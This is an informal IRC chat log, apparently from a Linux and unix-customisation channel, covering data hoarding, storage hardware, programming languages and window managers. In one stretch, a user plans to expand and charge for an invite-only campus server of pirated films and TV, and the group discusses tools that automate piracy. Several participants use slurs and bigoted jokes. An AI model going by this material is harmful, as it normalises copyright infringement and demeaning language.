02:37         mxtm │  all of them have "small" porn collections it seems
02:37  thang1thang │  He has a 4TB hard drive that he connects to his company computer and starts auto-downloading directories to his computer
02:37  thang1thang │  he has ~9TB
02:37  thang1thang │  so not that much
02:38  thang1thang │  and then he takes the 4TB hard drive and transfers it to hsi server every night :p
02:38         mxtm │  9TB isn't THAT much porn?!
02:38         mxtm │  I have just 9 TB of porn, yeah
02:38  thang1thang │  he has 960TB of storage at his house
02:38         mxtm │  christ
02:38         mxtm │  that's insane
02:38         mxtm │  but 9 TB of porn is insane too
02:38       phyrne │  "Those must be the new 8.1TB drives" huehuehuehue
02:38  thang1thang │  and he's downloading 4TB worth of information a day
02:38       phyrne │  That's a lot....
02:38  thang1thang │  the fact that, over 15 years of data hoarding, he's ONLY got 9TB of porn?
02:39  thang1thang │  that's not a lot of porn in perspective
02:39       phyrne │  I thought I was badass downloading 1.1TB in a week after joining Usenet :p
02:39  thang1thang │  lol
02:39  thang1thang │  one question, actually
02:39         mxtm │  do you know who is wonderful
02:39  thang1thang │  how does usenet transfer the data?
02:39         mxtm │  Fall Out Boy tho
02:39  thang1thang │  does it use torrent protocal
02:40  thang1thang │  or FTP or https directories?
02:40    BigE|Away │  no, direct downloads
02:40         mxtm │  no it's not P2P
02:40    BigE|Away │  ftp-esque
02:40         mxtm │  yep
02:40     BigE|Away│  BigE
02:40       phyrne │  yuss
02:40       phyrne │  Hi BigE 
02:40         BigE │  hi
02:40  thang1thang │  sweeet
02:41       phyrne │  I'll do a write up on my server setup on my blog soon
02:41  thang1thang │  I ask because my college's internet blocks FTP (I think)
02:41       phyrne │  I don't want it to die like my old blog
02:41  thang1thang │  and obviously throttles torrenting to shit
02:41       phyrne │  Ye
02:41         kori │  phyrne: link blog
02:41  thang1thang │  https downloading is safe, though
02:41       phyrne │  kori: http://blog.phyrne.co.uk
02:41         kori │  thanks
02:41       phyrne │  thang1thang2: Yep :)
02:41  thang1thang │  I downloaded ~48GB of ebooks in one night
02:41       phyrne │  kori: No problem
02:42  thang1thang │  oh hue I actually have seen your blog before
02:42         BigE │  thang1thang2: do they throttle vpn's?
02:42  thang1thang │  forgot to bookmark it the first time because there was no data on it
02:42       phyrne │  :)
02:42       phyrne │  Hah, I see :p
02:42         BigE │  cause you can get a decent one of those for like 3 bucks a month
02:42  thang1thang │  No they dont' throttle vpn's but it's not much use when free vpns are 50kb/s
02:42       phyrne │  Got a mention on BSD Now the other week :)
02:43         kori │  phyrne: interesting blog
02:43  thang1thang │  what kinda speeds can you get from a decent vpn?
02:43       phyrne │  kori: Thanks
02:43  thang1thang │  You know what's awesome about my university?
02:43  thang1thang │  Since the internet's pretty strict, about 8-10 years ago, someone built Antares
02:43  thang1thang │  an underground server that hooks up into the local 'net
02:44  thang1thang │  and is a server for downloading TV/Movies
02:44  thang1thang │  Invite only of course. Pretty fun
02:44       phyrne │  That's cool :)
02:44         mxtm │  woa
02:44         mxtm │  h
02:44  thang1thang │  Yeah. When break's over I'm gonna log back into the server (can't log outside of campus due to the campus wifi security protocals)
02:44  thang1thang │  and I'm gonna see if I got an email from the dude
02:45  thang1thang │  the new owner's graduating this spring, I think, and Antares is facing eminent shutdown for the second time
02:45  thang1thang │  so I'm gonna see if he'll share how he helped set it up. And I'm going to use some expertise from /r/DataHoarding and try to scrape together as many HDDs and stuff together as possible
02:45  thang1thang │  All I need is 16-20TB of storage and a basic built-from-scrap computer
02:46  thang1thang │  zfs and using raidz2 would be all we need as far as redundancy, security, speed, etc
02:46         mxtm │  and that's at your school right?
02:46  thang1thang │  and it'll get rid of the ridiculous raid card requirement
02:46  thang1thang │  Yeah, at the Uni
02:46         mxtm │  that's awesome
02:46  thang1thang │  I'd take the server home and cart it around and keep it safe, though.
02:46       phyrne │  Sounds like a really fun project :)
02:46  thang1thang │  I'm hoping to be able to upgrade the website, code it up and make it better, etc and see if I can make a subscription service
02:46         mxtm │  yeah that sounds really cool thang1thang2
02:46  thang1thang │  like, $5/month for unlimited speeds and "first access" to new releases
02:46         mxtm │  I wish I could help w/ something similiar around here
02:47  thang1thang │  and free users would be capped at 2MB/sec with access to new uploads after a week
02:47       phyrne │  Awesome
02:47  thang1thang │  And hopefully with the income from that, I'd be able to have a steady "income" to buy new HDDs and add them to the array so I can keep expanding the server
02:47  thang1thang │  we're actually almost out of space on it right now, and I'll have to build it from scratch most likely :/
02:48  thang1thang │  so things'll be a bit tight as far as money goes for a couple months
02:48  thang1thang │  But... if I pull it off and get even $100-150 a month. I could be adding 2TB worth of stuff to the server a month
02:49  thang1thang │  I'm excited, but I still gotta get everything rolling lol
02:49       phyrne │  Might I ask, how is the data shared? Various means? :)
02:49  thang1thang │  how is the data shared from the server?
02:49       phyrne │  Yep
02:49  thang1thang │  That's the coolest part of the server, actually
02:49       phyrne │  To the users
02:49  thang1thang │  The genius who built it in the first place built a website for it
02:50  thang1thang │  we have a website running that only works if you're inside the campus wifi
02:50  thang1thang │  you login with your user/password
02:50  thang1thang │  and you can access basically a HTTPS:// directory that's prettied up in a GUI
02:51  thang1thang │  The uploaders upload all the files with a specific name syntax, and the scripts that are listening on the server will take the movie/TV file and apply some IMDB info to the download page automatically
02:51       phyrne │  Fancy
02:51  thang1thang │  and then the user just downloads it with a download button and it's just like downloading off a series of links off a page
02:51  thang1thang │  Only since it's all internal, there's no traffic that shows up to the ISP
02:51  thang1thang │  and it bypasses all internet speeds and goes just by latency and router theoreticals
02:52  thang1thang │  I get ~5-5.5MB/s on the server from my room
02:52       phyrne │  That's pretty cool
02:52  thang1thang │  I've seen people hit nearly 1Gb/s when they were right next to the server tower xD
02:52       phyrne │  What about the method used to initialy obtain the data from the net? Just torrenting?
02:52  thang1thang │  Probably. Torrenting, ripping from donated media, etc
02:53  thang1thang │  A lot of the upper circle of the server are people who are off campus by now
02:53  thang1thang │  so they can walk in with ~30-50GB worth of stuff in flash drives or whatever and nobody cares
02:53  thang1thang │  the numbers aren't super huge since they have to be careful not to run out of space
02:53       phyrne │  Heh, fair play :)
02:53       phyrne │  Yeah of course
02:54  thang1thang │  I'm also hoping to see if I can find a way to optimize the data already on there...
02:54  thang1thang │  We have a LOT of stuff on the server that's never been downloaded once
02:54  thang1thang │  I'd estimate a good 30%, actually.
02:54  thang1thang │  Perhaps having a script that runs and anything not downloaded once after a year is automatically cleaned off and the file name dropped into a text file
02:55       phyrne │  Is the majority of it binary data?
02:55  thang1thang │  mm?
02:55       phyrne │  Videos, music?
02:55  thang1thang │  Ahh, yeah
02:55       phyrne │  binary data :)
02:55  thang1thang │  It's all video actually
02:55  thang1thang │  Movies/TV series
02:55       phyrne │  Ah cool
02:55  thang1thang │  We don't have music on there. I'd add that, eventually
02:55  thang1thang │  I would also add a textbook section
02:56       phyrne │  Won't see any results from ZFS compression then ;__;
02:56  thang1thang │  You can build a $200-250 machine that can scan an entire novel in ~5 minutes
02:56       phyrne │  Heh, that.... that is fucking cool :p
02:56  thang1thang │  yeah ;D
02:56  thang1thang │  so I'd build one of those fuckers
02:56  thang1thang │  and I'd go around and start making a massive invetory of high res textbooks and put them online
02:57       phyrne │  You heard of Sickbeard, CouchPotato, Headphones, LazyLibrarian? :)
02:57  thang1thang │  run them through OCR software, clean it up, etc
02:57  thang1thang │  mm... vaguely
02:57       phyrne │  Not sure why I even asked, was just curious :p
02:57  thang1thang │  oooh
02:58  thang1thang │  lazylibrarian actually looks really cool
02:58       phyrne │  It's 2AM, why am I still awake? And yeah, it is!
02:58       phyrne │  They all are
02:58  thang1thang │  So lazy librarian is basically a thing to automate pirating books?
02:58       phyrne │  Yep :)
02:59  thang1thang │  huehuehue
02:59  thang1thang │  that + sickbeard and couch potato... all those?
02:59  thang1thang │  I think if I ever get the server built successfully that I'm going to go on a HDD salvaging spree
02:59       phyrne │  :p
02:59  thang1thang │  Except I dunno if it'd be efficient to hook up, say, 50-60HDDs to a single computer
02:59         quit │  mxtm
03:00  thang1thang │  especially if they're all 60-250GB (stuff people throw out, basically)
03:00       phyrne │  Yeah :p
03:00  thang1thang │  that even possible/feasible?
03:00       phyrne │  Though, what choice do you have?
03:00       phyrne │  Yeah, of course
03:00  thang1thang │  true. When you're on a budget, you're on a budget lol
03:00  thang1thang │  I saw this one fucker on dataHoarders
03:01       phyrne │  Just.... don't expect it to be all that reliable .... or perform that great for that matter
03:01  thang1thang │  he bought like 30TB worth of hard drives on black friday
03:01       phyrne │  Haha
03:01  thang1thang │  got 'em for $30/drive
03:01       phyrne │  :o
03:01       phyrne │  Fuck
03:01  thang1thang │  they're usually $90
03:01       phyrne │  Yeah
03:01       phyrne │  ....
03:01  thang1thang │  I was like GAWDDAMN BRO
03:01       phyrne │  No fair
03:01       phyrne │  Haha
03:01  thang1thang │  He had like 8 boxes of hard drives shipped to him
03:01  thang1thang │  they were WD blacks too ;-;
03:02       phyrne │  Not bad :) I run Seagate Constallations
03:02         BigE │  wut
03:02         BigE │  I love WD
03:02         BigE │  really love their Red drives
03:02  thang1thang │  oh I'd be runnig whatever the hell I could run lol
03:02         BigE │  3TB each and only like 120 bucks
03:02         BigE │  which is nice
03:02       phyrne │  BigE: Oh yeah, I remember us talking about this :p
03:03  thang1thang │  niiice
03:03  thang1thang │  3TB for 120
03:03  thang1thang │  almost down to pre-tiwain flood days aren't they?
03:03       phyrne │  Heh :p
03:03  thang1thang │  or is it starting to get lower finally?
03:03         BigE │  it sould start to get a bit lower
03:03         BigE │  SSD's are catching up
03:04         BigE │  slowly
03:04         BigE │  but they are
03:04         BigE │  HDD's will always be better for mass storage
03:04         BigE │  but they have to stay somewhat competitive with SSD's
03:05  thang1thang │  yeah
03:05  thang1thang │  I'm excited about SSDs actually
03:05         BigE │  they are so great
03:05  thang1thang │  PCe-i SSDs are so wicked fast, and the tech seems to be maturing
03:06         BigE │  PCI-e*
03:06  thang1thang │  I wonder if people'll be using PCe to get past the 2GB/s cap or if we'll figure out some other way to do it
03:06  thang1thang │  damnit, sorry
03:06  thang1thang │  like, PCI-e is basically a contained RAID config, right?
03:06         BigE │  well, light peak can deliver up to like 80gbps
03:06  thang1thang │  so it's more volitaile and can't be used as a boot drive...
03:06  thang1thang │  wut
03:06         BigE │  yes
03:07  thang1thang │  oh thunderbolt
03:07         BigE │  lightpeak is the intel technology that runs it
03:07  thang1thang │  well yeah. I just forgot the codename
03:07         BigE │  thunderbolt is what everyone knows it as though because apple was the first one to use it, and therefore gets to brand it in the public image
03:07  thang1thang │  but yeah, I don't know why more people aren't jumping onto the lightpeak thing
03:07  thang1thang │  It's intel tech, so Apple can't lock others from using it?
03:08         BigE │  nope
03:08         BigE │  problem is
03:08         BigE │  it is expensive
03:08         BigE │  thunderbolt is in a similar situation to things like eSATA, or where USB3.0 was 5 years ago
03:08  thang1thang │  yeah...
03:08  thang1thang │  true
03:08         BigE │  it is mostly unclear whether it will actually catch on or not
03:09         join │  tida
03:09         mode │  +v tida
03:09  thang1thang │  Well, it can go up to 80gbps
03:09  thang1thang │  and there's a new one that intel's making
03:09  thang1thang │  it goes up to 1.6tbps
03:10  thang1thang │  "MXC"

03:12       phyrne │  The CouchPotato dev fixed some annoying bug, which was preventing me from running CouchPotato in a Zone on SmartOS :D
03:12  thang1thang │  lol nice
03:12       phyrne │  No more fucking Ubuntu KVM instance
03:14  thang1thang │  lol
03:14  thang1thang │  why did you need ubuntu kvm?
03:15       phyrne │  Just to run CP
03:15       phyrne │  Was the easiest option :p
03:15       phyrne │  I have a zone called 'corsair' that runs all my tools for downloading
03:15  thang1thang │  lol nice
03:15  thang1thang │  zone - as in like a window space on a window manager?
03:15       phyrne │  But CP would crash when running in it, so, I just span up an Ubuntu server
03:16       phyrne │  thang1thang2: Solaris Zones :)
03:16       phyrne │  Though, this is illumos :p
03:16  thang1thang │  ... DDR3 ram goes up to 17066MB/s which is .1302Tb/s
03:16  thang1thang │  so theoretically if we had a hard drive capable of exploiting the full 1.6tbps of the MXC thing
03:16  thang1thang │  it would be like 10 times faster than DDR3?
03:17         quit │  shorefire
03:18       phyrne │  I guess? :p I dunno
03:18  thang1thang │  yeah that seems off to me
03:18  thang1thang │  there's a reason we still need RAM for servers lol
03:19       phyrne │  I'm so tired, I really don't know why I'm up :p
03:19       phyrne │  thang1thang2: Haha, yeah
03:20  thang1thang │  Now
03:20  thang1thang │  hypothetically speaking, if HDDs become faster than RAM
03:20  thang1thang │  we would have almost no need to have RAM, except for the fact that data transfer is limited by the speed of light
03:21       phyrne │  I suppose yeah
03:21  thang1thang │  so you'd want the HDD to be utilizing RAM so you could keep them somewhere else other than 3 inches away from the CPU
03:21  thang1thang │  the RAM would be a buffer, in that case
03:23  thang1thang │  but yeah go to bed damnit
03:23       phyrne │  :p
03:23       phyrne │  2:23

03:26       phyrne │  :p
03:27       phyrne │  Free does have a huge following and community, I'd like to some day see why. Though, to be fair, the one reason I even considered it: ZFS on BSD
03:27       phyrne │  That's a great reason.... but it just didn't make up for the rest of it
03:27       phyrne │  Not for me anyway

03:33  thang1thang │  btw phyrne, how would you recommend I learn to get really comfortable with sysadmin stuff, and stuff like grep and the unix tools as well as actually being able to sit down and understand how to fix errors rather tha just mindlessly googling everything?
03:34       phyrne │  thang1thang2: Hmmmmm, it depends. The nack of actually putting the tools together and learning how to debug issues and resolve them comes with actual practice
03:34       phyrne │  With regards to learning the tools themselves; books
03:34       phyrne │  books and manpages
03:34       phyrne │  And playing around with them yourself
03:35     Ampharos │  learn by doing
03:35       phyrne │  Then learning how you can use them together to your advantage :)
03:35     Ampharos │  i wrote a gaem a few days ago
03:35       phyrne │  Ampharos: orly? Sick
03:35  thang1thang │  gaem?
03:35       phyrne │  What language?
03:35     Ampharos │  C#
03:35  thang1thang │  oh, game
03:36       phyrne │  Heh, thought as much ;)
03:36     Ampharos │  runs on linux and windows
03:36     Ampharos │  magic eh
03:36       phyrne │  That's cool though man!
03:36  thang1thang │  Alright, I was just wondering if there was a smidge of a shortcut or something to speed up the learn-by-doing method. Thanks
03:36  thang1thang │  What's the game about?
03:36     Ampharos │  it's a card game

03:36         dcat │  wtf.
03:36     Ampharos │  you won genetic lottery
03:36     Ampharos │  and the race
03:37     Ampharos │  maybe itll be the only thing in your life you win
03:37       phyrne │  I really need to buckle down and learn me a proper language.... but I'm going through The Book of PF AND The TCP/IP Guide right now...... that's a lot of reading ;~;
03:37         dcat │  genetic lottery?
03:37     Ampharos │  i still haven't built pf box
03:37         BigE │  phyrne: be like all the cool kids and learn golang
03:37       phyrne │  Ampharos: You used PF at all?
03:37       phyrne │  BigE: Haha, nahhhh
03:38     Ampharos │  not yet
03:38  thang1thang │  Book of PF?
03:38       phyrne │  I think I'd like to learn Python, Ruby, Erlang, maybe pick up some C too
03:38     Ampharos │  routers are big, power hungry, and i need upnp
03:38       phyrne │  thang1thang2: Yeah, the definitive guide to learning PF inside and out
03:38         quit │  Ampharos
03:38  thang1thang │  I'd probably learn C++ over C myself. But that's just because I like C++ more

03:39  thang1thang │  lol nice. I'll have to read it then :)
03:39  thang1thang │  phyrne proposed
03:39  thang1thang │  the wedding's monday
03:39       phyrne │  Ampharos: tmux you faggot
03:39         BigE │  you missed someone saying that cpp is better than C
03:39       phyrne │  thang1thang2: Yeah bby <3
03:39  thang1thang │  didn't say it was better -_- just said I like it more as a preference
03:40  thang1thang │  <3 u too phyrne
03:40         BigE │  i khow
03:40         BigE │  know*
03:40       phyrne │  :p
03:40  thang1thang │  better object oriented programming. No overwhelming obsession to use pointers for every-fucking-thing
03:40  thang1thang │  stuff like that

03:41  thang1thang │  golang?
03:41  thang1thang │  really?
03:41         BigE │  i really have no idea
03:41       phyrne │  There does seem to have been a recent influx in boners for golang....
03:41         BigE │  someone was on here the other day not shutting the fuck up about it
03:41  thang1thang │  yeah, everyone likes the latest and greatest thing
03:42  thang1thang │  except it's not the greatest
03:42       phyrne │  BigE: I've joined to see that several times :/
03:42         BigE │  lul
03:42  thang1thang │  the fuck is go even good for anyway?
03:42         BigE │  Go is  good for.... a lot of things
03:42         BigE │  i guett
03:42     Ampharos │  golang? l
03:42         BigE │  guess*
03:42     Ampharos │  use c#
03:42         dcat │  golang is awesome lel
03:43         BigE │  otherwise Google and Cloudflare wouldnt use it on all their internal stuff
03:43       phyrne │  Oh you, dcat
03:43       phyrne │  :p
03:43     Ampharos │  c# mustard rice
03:43  thang1thang │  the reason google uses golang on their internal stuff
03:43         dcat │  seriously, golang is awesome
03:43  thang1thang │  is golang is singlemindedly focused towards hyperfast compilation speeds
03:43         BigE │  is becaute golang is their inhouse lang?
03:43         BigE │  and concurrency
03:44  thang1thang │  and they've built a shit ton of garbage-collection into it
03:44         BigE │  and garbage collection
03:44         quit │  tida
03:44         BigE │   and other fun stuff

03:44      bottomy │  their concurrency model looked alright
03:44  thang1thang │  lol what da fuck
03:44     Ampharos │  golang is distilled autism from plan9
03:44         BigE │  their concurrency model is identical to erlang
03:44  thang1thang │  lol
03:45  thang1thang │  distilled autism
03:45     Ampharos │  they dilluted the autism so other oses can handle it
03:45       phyrne │  Fucking plan9
03:45         dcat │  lel
03:45       phyrne │  (I just wanted to contribute to the conversation)
03:46     Ampharos │  phyrne is cool as fuck
03:46      bottomy │  I just don't think it's applicable to what the language is trying to do (replace C). since if you're replacinging a low level language you'll still want greater control over threading, even though for purely concurrent applications the former is much nicer to use
03:46         dcat │  I remeber my first conversation to phyrne on here was about plan9 autism
03:46       phyrne │  Ampharos: u jel?
03:46     Ampharos │  i use xmpp a lot nowadays
03:46     Ampharos │  my friends used to use irc but tards came in so we just use xmpp now
03:46     Ampharos │  shame about the lack of good xmpp console clients
03:46         BigE │  golang is trying to C and a scripting language rolled into a sturdy compiled language
03:46     Ampharos │  mcabber is kinda there but shitty
03:47         dcat │  how the hell does one fight off 12 cops /while/ masturbating
03:47         BigE │  which from what i have read, it does alright at
03:47         dcat │  I love golangs take on cross-compiling though
03:47      bottomy │  it just seems like it's trying to be too many things IMO, like dread the thought if it was to become another C++
03:47         dcat │  GOARCH=armv6 golang build app.go
03:48     Ampharos │  hey, uriel's jealous bjarne wrote c++ to make programmers money
03:48     Ampharos │  bjarne killed uriel before he could use autismbombs to create an anarcho-capitalist plan9 using utopia where go reigns supreme
03:48         dcat │  C++ is cancer
03:49      bottomy │  Ampharos: seems like you've got your facts right :P
03:49       phyrne │  "Cloud To Butt Plus" <-- I want to use Chrome just to use this
03:49     Ampharos │  write a regex for a squid proxy
03:50       phyrne │  Could do that, but am not running squid right now
03:50     Ampharos │  that way you can break the internet with the popular new cdn buttflare
03:50       phyrne │  Haha
03:50     Ampharos │  install Butt to Butt plus
03:50         BigE │  bottomy: i agree. What do you think of the syntax?
03:51         BigE │  to me, it seems really odd
03:51      bottomy │  yeh it's odd
03:51         BigE │  like
03:51         BigE │  almost offputting
03:51         BigE │  erlang is more welcoming to me
03:51         BigE │  lol
03:51         BigE │  i dont even know why
03:51      bottomy │  some things I can see make sense, but some things I can't see why they did (such as typing it goes on the right hand side if I remember)
03:52         BigE │  i have been doing a little bit of golang this afternoon
03:52         BigE │  and like
03:52     Ampharos │  i want to learn functional but no things to apply it to where it makes sense
03:52         BigE │  i just dont like the syntax
03:52     Ampharos │  i like lisp syntax (i tried ML, didn't like syntax)
03:52         BigE │  they try to be procedural, but seem to just throw in functional programming concepts in arbitrary places
03:52     Ampharos │  i want a good functional lang (read no js or dervivs) with c style syntax
03:53         BigE │  and then it is typed like a scripting language
03:53         BigE │  Ampharos: i quite like Groovy, but that is java syntax
03:53         BigE │  which isnt exactly leaps and bounds from C
03:53         BigE │  but still different
03:55  thang1thang │  mm
03:55     Ampharos │  java is like c#'s retarded elder bother so close fit
03:55         quit │  Ampharos
03:56  thang1thang │  Reading a nice article on golang right now
03:56         dcat │  http://i.imgur.com/3KyNIqo.jpg 
03:56  thang1thang │  Golang seems like one of those mythical languages right now
03:56      bottomy │  lol
03:56  thang1thang │  has the potential to be either really really cool
03:56  thang1thang │  or niche and shit
03:58  thang1thang │  I don't like the fact that go doesn't even allow you to go deeper into the code
03:58         kori │  Is it morally wrong to use both vim and emacs
03:58  thang1thang │  nah
03:58  thang1thang │  they're both pretty much the same, but they do different things better
03:59      bottomy │  what do you mean by "deeper into the code"?
03:59  thang1thang │  It'd be nice if go (or any language) had a really powerful automatic garbage collector, automatic this and that so you could write it with almost the same high(er) level ability as you would python/go/javascript
03:59  thang1thang │  but allowed you to, at will, override said automatics
04:00  thang1thang │  and get deep into the memory of the program to pick at this part here and that part there and generally have the same low level abilities as C/C++
04:00      bottomy │  well to do that you could use a manual memory based language, and then a GC library
04:00  thang1thang │  yeah...
04:00      bottomy │  so you could opt in what you want to fall under GC and what you don't
04:01      bottomy │  but yeh it's kind of messy
04:01  thang1thang │  If it was created super clean so it was effortless to swap back and forth then it could probably be the ideal language
04:01  thang1thang │  but then again, every single language tries to be the ideal language, I think
04:01  thang1thang │  What would really be better is to make programs capable of executing different parts of the code in different languages
04:01      bottomy │  I do like ARC, defining the actual ownership of objects/memory, is a nice way to dealing with memory management.
04:02  thang1thang │  And then simplify all the existing languages down to what they're really really good at and then using the unix philosophy of "make it do one thing well, and pipe in/out revelant data"
04:02         BigE │  thang1thang2: except C, that just says "i will do nothing for you unless you explicitly state it"
04:02  thang1thang │  So C is a jewish lawyer
04:03  thang1thang │  But with that ideal situation, you could know 3-5 languages and use them all in a program and just use each language for what it's good at rather than everyone writing new languages that " do everything the better way® "
04:04      bottomy │  ^
04:05         BigE │  well, that is never gonna happen
04:05  thang1thang │  lol no it's not
04:05  thang1thang │  it would requite an almost complete rewrite of every existing language of the world
04:05         BigE │  so i guess we just have to use whatever is best
04:06         BigE │  i know C, java, some ASM, some Python, a bit of bash, some erlang, and i can do passable Groovy
04:06  thang1thang │  the C family would have to be dissolved into a singular C language that did "C things" well. Java would be rewritten to be more clear and stop trying to do too many things. JS/Python would probably be wrapped into each other, etc, etc... So yeah, it's a pipe dream, but it'd be pretty cool if that happened I think
04:06  thang1thang │  and niice
04:06  thang1thang │  Newby at C++ and that's it, pretty much. Haven't had enough programming experience
04:06         join │  fenriz
04:06         BigE │  the thing is, i dont know any language exceptionally well
04:07         mode │  +v fenriz
04:07         BigE │  so that is shit
04:07       fenriz │  yeah you are.
04:07      bottomy │  lol
04:07         BigE │  but i just end up with really hacky solutions to things because i dont know how to always fully leverage the language
04:08  thang1thang │  eh, kinda like me and vim right now
04:08  thang1thang │  I use 5x the keypresses I need to, and my shell script that I'm trying to set up is probably a huge fucking mess
04:08  thang1thang │  I'm going to branch it into like 7-8 files maybe and have each of them be called by the script so I can have it better organized
04:08      bottomy │  thang1thang2: well plain old C does what it does well, it just needs some more things added to it's standard such as vector type (SIMD), and some things that aren't standardized really need to be such as bitfield order
04:09  thang1thang │  Aren't a couple of the C++ additions actually really useful?
04:09  thang1thang │  Seem to recall reading something about arrays and variable memory and a couple other things like that. But that might've just been about the C family in general
04:10      bottomy │  they both have arrays and variable memory lol
04:10  thang1thang │  right -_-
04:10  thang1thang │  I knew that
04:10      bottomy │  C++ is just more type safe/strict, and then adds a lot of higher level features like OOP, templates, etc.
04:11      bottomy │  C doesn't really need that stuff, the less type safe it is the better IMO, since it tries to stay low level
04:11  thang1thang │  yeah. I'm guessing C++ was created to add a much higher level of abstraction to C so that it could do "everything"?
04:11  thang1thang │  allowing people to write code faster or whatever?
04:12      bottomy │  yeh write code faster, more reusable systems, etc.
04:12         BigE │  same thing java does
04:12  thang1thang │  But if we ever did have that theoretical situation where you could pipe languages as necessary C++ would be redundant and harmful rather than useful to the design
04:12         BigE │  lul
04:12  thang1thang │  so yeah lol
04:13      bottomy │  but what it has done is add soo many features it's hard to decide what you should use for certain things
04:13  thang1thang │  Just code it in 5 different ways
04:13      bottomy │  lol
04:13  thang1thang │  and then play russian roulette with comment blocks until you find the fastest compile time

04:58  thang1thang │  use it as a deep tissue back massager at that setting lol
04:59  thang1thang │  or make it 12 and use it for tenderizing beef
05:01        tbuck │  lol thats awesome
05:01        tbuck │  just in case... you never know

05:03  thang1thang │  just shhhh and accept it

05:18        tbuck │  i do alright until those fuckers decide to board my ship
05:19  thang1thang │  FTL?
05:19         BigE │  you, at times, barely scrape by
05:19        tbuck │  it is fun though

05:21        tbuck │  overloaded
05:21         BigE │  i had it to begin with

05:28       fenriz │  some base16 
05:28       fenriz │  some BAR. (it broke on me today)
05:28       fenriz │  and voila.
05:28        tbuck │  most of my "theme" comes from my terminal colors
05:28       fenriz │  sam
05:28       fenriz │  same
05:28       fenriz │  terminal colors + vim schemes
05:29        tbuck │  my wm really only colors the window borders
05:29  thang1thang │  same here
05:29  thang1thang │  I'm just trying to get my wm setup complete so I can ditch the mouse and 99% of aqua
05:29       fenriz │  hate mice. 
05:29  thang1thang │  well it's trackpad on a mac so it's really sexy
05:29        tbuck │  i play too many games and browse too much webs to ditch my mouse
05:30  thang1thang │  so it's not TOO bad since I don't lose a lot of time swapping from keyboard to pad and back
05:30  thang1thang │  and you can browse web with just a keyboard 95% of the time
05:30  thang1thang │  games require a mouse though, but eh
05:30        tbuck │  yeah but its not ideal...
05:31        tbuck │  webpages are just too picky with vimperator, things like dropdown menus n such
05:31  thang1thang │  vimperator?
05:31        tbuck │  plus i can power browse reddit with one hand on the mouse

05:34  thang1thang │  penta*
05:35        tbuck │  sadly, its rarely up to date
05:35        tbuck │  i dont think ive gotten a chance to try it out
05:35        tbuck │  not for FF 25 it says
05:35  thang1thang │  pentadactyl?
05:35         quit │  fenriz
05:35  thang1thang │  really? That's odd
05:36        tbuck │  maybe it would work it i skipped the compatability check or whatever, but vimperator is ok for now
05:37  thang1thang │  pentadactyl's basically nightlys only
05:37  thang1thang │  it hasn't had a "stable" release for a long time, I think
05:37  thang1thang │  but it's latest update was 4 hours ago :p
05:38        tbuck │  oh maybe thats why
05:38        tbuck │  i've always gone to the FF addons pages
05:38  thang1thang │  yeah
05:38        tbuck │  which is stuck at v1.0
05:38  thang1thang │  same for their homepage
05:38  thang1thang │  https://code.google.com/p/dactyl/downloads/list
05:39  thang1thang │  latest is pentadactyl-20131229 uploaded (4 hours ago)

05:45     NeoTerra │  BigE not much, spent the day in London ON
05:45     NeoTerra │  you?
05:45         BigE │  meh, i like xmonad better
05:45         BigE │  nothing
05:46  thang1thang │  what's herbstluftwm's cool features?
05:46    dimeshake │  this scrot is what ended up pushing me to trying it: http://unek.czarnawol.ga/screen.png
05:46  thang1thang │  what does a scrot stand for anyway?
05:46    dimeshake │  it's nothing enormously special but I'd wanted to try it anyway, and ther ewas enough to like about it to do it 
05:46    dimeshake │  screenshot 
05:47  thang1thang │  that's a pretty nice scrot
05:47  thang1thang │  and I would've thought ss would've stood for screenshot...
05:47  thang1thang │  but scrot kinda works I guess
05:47  thang1thang │  such eye candy, many shadows
05:47     NeoTerra │  BigE the bandwidth on the shells seems to be fine for the time being, nothing to worry about btw
05:48         BigE │  okay
05:48         BigE │  we will see what happens once it gets out of the preliminary spinup time
05:48         BigE │  which usually takes a few days
05:48     NeoTerra │  yup
05:49        tbuck │  thang1thang2: scrot is the name of the program that snaps the screenshots
05:49  thang1thang │  oooh
05:49  thang1thang │  that explains it
05:49        tbuck │  i guess its just become the universal name
05:50        tbuck │  SCReen shOT i guess
05:50  thang1thang │  yeah,
05:50  thang1thang │  plus a lot of ubiquis programs become the name itself like that
05:51  thang1thang │  ubiquious
05:55       libbro │  Has anyone here had problems with RES and Iceweasel?
05:56  thang1thang │  problems how?
05:56  thang1thang │  like getting stuff like vimperator to work right?
05:56       libbro │  It not working out
05:56       libbro │  It doesn't work, that is
05:58  thang1thang │  No, I can't say that I have, sorry
05:58  thang1thang │  haven't attempted to use iceweasel
05:58       libbro │  Okay, thanks
06:02         BigE │  iceweasel is firefoz
06:02         BigE │  firefox*
06:02       libbro │  I know...
06:02       libbro │  but it seems to be an Iceweasel specific issue
06:02       libbro │  AFAIK
06:02         BigE │  im talking to other guy
06:03       libbro │  okay..
06:03         BigE │  iceweasel is exactly the same as FF except all the branding is FOSS licensed
06:03       libbro │  Yep
06:03       libbro │  It respect MUH FREEDUMBS!!!!
06:03         BigE │  so that is bizarre
06:09         BigE │  Homeland, y u so addictive
06:09        tbuck │  aww man. shift+arrow key in ncurses DF is buggy. thats crucial. oh well no DF over ssh i guess
06:11  thang1thang │  shift + arrow key?
06:11  thang1thang │  why is that so crucial?
06:11        tbuck │  move your cursor 11 blocks instead of 1
06:13  thang1thang │  oooh dwarf fortress
06:13        tbuck │  haha yeh
06:13  thang1thang │  right, I thought you were doing something different for something
06:13  thang1thang │  for some reason*
06:16        tbuck │  of course not. my brain is on vacation for a bit. other than a few little projects im not doing much else
06:17        tbuck │  which reminds me, ive got a nice lil SSD here waiting to be installed
06:19         kori │  wait are we posting rice
06:19  thang1thang │  everyone's always posting rice
06:19  thang1thang │  POST RICE
06:20  thang1thang │  china is hungry
06:20        tbuck │  my rice hasnt chanced in a while

06:24  thang1thang │  ahh got it, nice
06:24         kori │  https://github.com/venam/2bwm
06:24  thang1thang │  it's pure floating right?
06:25         kori │  yes
06:25         kori │  you can arrange windows via your keyboard though
06:25         kori │  which I don't really use a lot but it's nice to have it there
06:25  thang1thang │  meh
06:25  thang1thang │  13" screen here
06:25  thang1thang │  I really need tiling xD
06:25         kori │  these borders are damn sexy though

06:27         kori │  emptytapes didn't really pay attention to my compliment but I like what he did
06:27  thang1thang │  that's emptytape's scrot?
06:27         kori │  yes
06:27  thang1thang │  damnsondatsnice
06:27  thang1thang │  really like his color scheme he's got going on too
06:28   Neuromatic │  http://i.imgur.com/VWaRBBD.png
06:28  thang1thang │  all I would have to do is change the green to a more blue color and I could have a really sweet matching theme for my background
06:28         kori │  thang1thang2: I should say thanks because that's my colorscheme 
06:28        tbuck │  i think i used that scheme for a while
